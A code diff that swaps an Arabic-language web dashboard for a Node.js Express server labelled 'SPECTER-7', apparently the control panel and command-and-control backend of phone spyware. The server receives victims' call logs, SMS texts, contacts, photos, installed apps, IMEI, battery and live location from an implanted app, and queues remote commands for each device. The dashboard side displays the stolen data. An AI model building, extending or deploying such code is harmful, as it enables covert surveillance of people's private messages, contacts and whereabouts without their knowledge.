@@ -1,268 +1,257 @@
-// التحقق من تسجيل الدخول
-if (sessionStorage.getItem('logged_in') !== 'true') {
-    window.location.href = 'login.html';
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const fs = require('fs');
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Middleware
+app.use(cors());
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(express.static('public'));
+
+// إنشاء مجلد البيانات
+const dataDir = path.join(__dirname, 'data');
+if (!fs.existsSync(dataDir)) {
+    fs.mkdirSync(dataDir, { recursive: true });
 }
 
-let currentDevice = null;
-let updateInterval = null;
-
-function logout() {
-    sessionStorage.removeItem('logged_in');
-    window.location.href = 'login.html';
+const devicesFile = path.join(dataDir, 'devices.json');
+if (!fs.existsSync(devicesFile)) {
+    fs.writeFileSync(devicesFile, '[]');
 }
 
-// تحميل الأجهزة
-async function loadDevices() {
+// ============ API Routes ============
+
+// استقبال البيانات من التطبيق
+app.post('/upload.php', (req, res) => {
     try {
-        const response = await fetch('/devices.json');
-        const devices = await response.json();
+        const data = req.body;
+        const deviceId = data.device_id || 'unknown';
         
-        const select = document.getElementById('deviceSelect');
-        select.innerHTML = '<option value="">اختر الجهاز...</option>';
+        const deviceDir = path.join(dataDir, deviceId);
+        if (!fs.existsSync(deviceDir)) {
+            fs.mkdirSync(deviceDir, { recursive: true });
+            fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true });
+        }
         
-        devices.forEach(device => {
-            const option = document.createElement('option');
-            option.value = device.id;
-            option.textContent = device.id;
-            select.appendChild(option);
-        });
+        const dataFilePath = path.join(deviceDir, 'data.json');
+        let existingData = {};
+        if (fs.existsSync(dataFilePath)) {
+            existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
+        }
+        
+        if (data.type === 'all' && data.data) {
+            existingData = { ...existingData, ...data.data };
+        } else if (data.data) {
+            existingData[data.type] = data.data;
+        }
+        
+        fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
+        
+        updateDevicesList(deviceId);
+        
+        res.json({ success: true });
     } catch (e) {
-        console.error('Devices error:', e);
+        res.json({ error: e.message });
     }
-}
+});
 
-function selectDevice(deviceId) {
-    currentDevice = deviceId;
-    if (updateInterval) clearInterval(updateInterval);
-    if (deviceId) {
-        updateInterval = setInterval(updateLiveData, 3000);
-        updateLiveData();
-        loadAllData();
-    }
-}
-
-async function updateLiveData() {
-    if (!currentDevice) return;
-    
+// استقبال الحالة الحية
+app.post('/live_update.php', (req, res) => {
     try {
-        const response = await fetch(`/live.php?device=${currentDevice}`);
-        const data = await response.json();
+        const data = req.body;
+        const deviceId = data.device_id || 'unknown';
         
-        const statusEl = document.getElementById('networkStatus');
-        if (data.online) {
-            statusEl.textContent = data.network || 'متصل';
-            statusEl.className = 'value online';
+        const deviceDir = path.join(dataDir, deviceId);
+        if (!fs.existsSync(deviceDir)) {
+            fs.mkdirSync(deviceDir, { recursive: true });
+        }
+        
+        const liveFile = path.join(deviceDir, 'live.json');
+        let live = {};
+        if (fs.existsSync(liveFile)) {
+            live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
+        }
+        
+        live.network = data.network || 'متصل';
+        live.battery = data.battery || null;
+        live.location = data.location || null;
+        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
+        
+        fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
+        
+        updateDevicesList(deviceId);
+        
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// الحصول على البيانات الحية
+app.get('/live.php', (req, res) => {
+    try {
+        const deviceId = req.query.device;
+        
+        if (!deviceId) {
+            return res.json({ error: 'Device ID required' });
+        }
+        
+        const liveFile = path.join(dataDir, deviceId, 'live.json');
+        const dataFile = path.join(dataDir, deviceId, 'data.json');
+        
+        let response = {
+            online: false,
+            network: 'غير متصل',
+            battery: null,
+            location: null,
+            last_seen: 0,
+            seconds_ago: 999999
+        };
+        
+        if (fs.existsSync(liveFile)) {
+            const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
+            const lastSeen = live.last_seen || 0;
+            
+            response = {
+                online: (Math.floor(Date.now() / 1000) - lastSeen) < 30,
+                network: live.network || 'غير معروف',
+                battery: live.battery || null,
+                location: live.location || null,
+                last_seen: lastSeen,
+                seconds_ago: Math.floor(Date.now() / 1000) - lastSeen
+            };
+        }
+        
+        if (fs.existsSync(dataFile)) {
+            const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+            response.call_count = (allData.call_logs || []).length;
+            response.sms_count = (allData.sms || []).length;
+            response.contacts_count = (allData.contacts || []).length;
+            response.images_count = (allData.images || []).length;
+            response.apps_count = (allData.installed_apps || []).length;
+        }
+        
+        res.json(response);
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// الحصول على بيانات محددة
+app.get('/api.php', (req, res) => {
+    try {
+        const action = req.query.action;
+        const deviceId = req.query.device;
+        const type = req.query.type;
+        
+        if (action === 'get_data') {
+            const dataFile = path.join(dataDir, deviceId, 'data.json');
+            if (fs.existsSync(dataFile)) {
+                const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+                if (type && type !== 'all' && allData[type]) {
+                    res.json(allData[type]);
+                } else {
+                    res.json(allData);
+                }
+            } else {
+                res.json([]);
+            }
+        } else if (action === 'get_live') {
+            const liveFile = path.join(dataDir, deviceId, 'live.json');
+            if (fs.existsSync(liveFile)) {
+                res.json(JSON.parse(fs.readFileSync(liveFile, 'utf8')));
+            } else {
+                res.json({});
+            }
+        } else if (action === 'get_commands') {
+            const commandsFile = path.join(dataDir, deviceId, 'commands.json');
+            if (fs.existsSync(commandsFile)) {
+                const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
+                fs.writeFileSync(commandsFile, '[]');
+                res.json({ commands });
+            } else {
+                res.json({ commands: [] });
+            }
         } else {
-            statusEl.textContent = 'غير متصل';
-            statusEl.className = 'value offline';
+            res.json({ error: 'Invalid action' });
         }
-        
-        if (data.location && data.location.latitude) {
-            document.getElementById('locationStatus').textContent = 
-                `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`;
-            document.getElementById('locationStatus').className = 'value online';
-        }
-        
-        if (data.battery !== null && data.battery !== undefined) {
-            document.getElementById('batteryStatus').textContent = data.battery + '%';
-        }
-        
-        if (data.seconds_ago !== undefined) {
-            const lastSeen = document.getElementById('lastSeen');
-            if (data.seconds_ago < 10) lastSeen.textContent = 'الآن';
-            else if (data.seconds_ago < 60) lastSeen.textContent = `${data.seconds_ago} ثانية`;
-            else lastSeen.textContent = `${Math.floor(data.seconds_ago / 60)} دقيقة`;
-        }
-        
-        if (data.call_count !== undefined) 
-            document.getElementById('callCount').textContent = `(${data.call_count})`;
-        if (data.sms_count !== undefined) 
-            document.getElementById('smsCount').textContent = `(${data.sms_count})`;
-        if (data.contacts_count !== undefined) 
-            document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
-        if (data.images_count !== undefined) 
-            document.getElementById('imagesCount').textContent = `(${data.images_count})`;
-        if (data.apps_count !== undefined) 
-            document.getElementById('appsCount').textContent = `(${data.apps_count})`;
-        
     } catch (e) {
-        console.error('Live error:', e);
+        res.json({ error: e.message });
     }
-}
+});
 
-async function loadAllData() {
-    if (!currentDevice) return;
-    await loadCalls();
-    await loadSMS();
-    await loadContacts();
-    await loadApps();
-    await loadDeviceInfo();
-}
-
-async function loadCalls() {
+// إرسال أمر
+app.post('/api.php', (req, res) => {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
-        const calls = await response.json();
-        const tbody = document.getElementById('callsTable').querySelector('tbody');
-        tbody.innerHTML = '';
+        const { device, command } = req.body;
         
-        if (!calls || calls.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#888;">لا توجد مكالمات</td></tr>';
-            return;
+        if (!device || !command) {
+            return res.json({ error: 'Device and command required' });
         }
         
-        calls.forEach(call => {
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td>${call.number || ''}</td>
-                <td>${formatDuration(call.duration)}</td>
-                <td>${getCallType(call.type)}</td>
-                <td>${formatDate(call.date)}</td>
-            `;
-            tbody.appendChild(row);
+        const deviceDir = path.join(dataDir, device);
+        if (!fs.existsSync(deviceDir)) {
+            fs.mkdirSync(deviceDir, { recursive: true });
+        }
+        
+        const commandsFile = path.join(deviceDir, 'commands.json');
+        let commands = [];
+        if (fs.existsSync(commandsFile)) {
+            commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
+        }
+        
+        commands.push({
+            command,
+            timestamp: Math.floor(Date.now() / 1000),
+            status: 'pending'
         });
-    } catch (e) {}
-}
-
-async function loadSMS() {
-    try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
-        const smsList = await response.json();
-        const tbody = document.getElementById('smsTable').querySelector('tbody');
-        tbody.innerHTML = '';
         
-        if (!smsList || smsList.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#888;">لا توجد رسائل</td></tr>';
-            return;
-        }
+        fs.writeFileSync(commandsFile, JSON.stringify(commands));
         
-        smsList.forEach(sms => {
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td>${sms.address || ''}</td>
-                <td>${sms.body || ''}</td>
-                <td>${formatDate(sms.date)}</td>
-                <td>${sms.type == 1 ? '📥 وارد' : '📤 صادر'}</td>
-            `;
-            tbody.appendChild(row);
-        });
-    } catch (e) {}
-}
-
-async function loadContacts() {
-    try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
-        const contacts = await response.json();
-        const tbody = document.getElementById('contactsTable').querySelector('tbody');
-        tbody.innerHTML = '';
-        
-        if (!contacts || contacts.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;color:#888;">لا توجد جهات اتصال</td></tr>';
-            return;
-        }
-        
-        contacts.forEach(contact => {
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td>${contact.name || 'بدون اسم'}</td>
-                <td>${Array.isArray(contact.numbers) ? contact.numbers.join(', ') : ''}</td>
-            `;
-            tbody.appendChild(row);
-        });
-    } catch (e) {}
-}
-
-async function loadApps() {
-    try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
-        const apps = await response.json();
-        const tbody = document.getElementById('appsTable').querySelector('tbody');
-        tbody.innerHTML = '';
-        
-        if (!apps || apps.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد تطبيقات</td></tr>';
-            return;
-        }
-        
-        apps.forEach(app => {
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td>${app.name || ''}</td>
-                <td>${app.package || ''}</td>
-                <td>${app.system_app ? 'نعم' : 'لا'}</td>
-            `;
-            tbody.appendChild(row);
-        });
-    } catch (e) {}
-}
-
-async function loadDeviceInfo() {
-    try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
-        const info = await response.json();
-        const div = document.getElementById('deviceInfo');
-        
-        if (!info || Object.keys(info).length === 0) {
-            div.innerHTML = '<p style="color:#888;">لا توجد معلومات</p>';
-            return;
-        }
-        
-        div.innerHTML = `
-            <table>
-                <tr><td style="color:#888;">الموديل:</td><td>${info.model || ''}</td></tr>
-                <tr><td style="color:#888;">العلامة:</td><td>${info.brand || ''}</td></tr>
-                <tr><td style="color:#888;">النظام:</td><td>${info.os_version || ''}</td></tr>
-                <tr><td style="color:#888;">IMEI:</td><td>${info.imei || ''}</td></tr>
-                <tr><td style="color:#888;">الناقل:</td><td>${info.carrier || ''}</td></tr>
-                <tr><td style="color:#888;">الذاكرة:</td><td>${formatBytes(info.total_ram)}</td></tr>
-                <tr><td style="color:#888;">المساحة الحرة:</td><td>${formatBytes(info.free_storage)}</td></tr>
-            </table>
-        `;
-    } catch (e) {}
-}
-
-function switchTab(tabName) {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
-    
-    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
-    if (tab) tab.classList.add('active');
-    
-    const pane = document.getElementById(`${tabName}Tab`);
-    if (pane) pane.classList.add('active');
-}
-
-function formatDuration(seconds) {
-    if (!seconds || seconds < 0) return '0:00';
-    return `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
-}
-
-function formatDate(timestamp) {
-    if (!timestamp) return '—';
-    try {
-        return new Date(timestamp).toLocaleString('ar');
+        res.json({ success: true });
     } catch (e) {
-        return '—';
+        res.json({ error: e.message });
     }
-}
+});
 
-function formatBytes(bytes) {
-    if (!bytes || bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}
-
-function getCallType(type) {
-    switch(parseInt(type)) {
-        case 1: return '📥 وارد';
-        case 2: return '📤 صادر';
-        case 3: return '❌ فائت';
-        default: return 'غير معروف';
+// الحصول على قائمة الأجهزة
+app.get('/devices.json', (req, res) => {
+    try {
+        const devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
+        res.json(devices);
+    } catch (e) {
+        res.json([]);
     }
+});
+
+// ============ Helper Functions ============
+
+function updateDevicesList(deviceId) {
+    let devices = [];
+    if (fs.existsSync(devicesFile)) {
+        devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
+    }
+    
+    const index = devices.findIndex(d => d.id === deviceId);
+    if (index >= 0) {
+        devices[index].last_seen = Math.floor(Date.now() / 1000);
+    } else {
+        devices.push({
+            id: deviceId,
+            first_seen: Math.floor(Date.now() / 1000),
+            last_seen: Math.floor(Date.now() / 1000)
+        });
+    }
+    
+    fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
 }
 
-// تحميل الأجهزة عند الفتح
-loadDevices();
-setInterval(loadDevices, 10000);
+// ============ Start Server ============
+
+app.listen(PORT, () => {
+    console.log(`SPECTER-7 Server running on port ${PORT}`);
+});
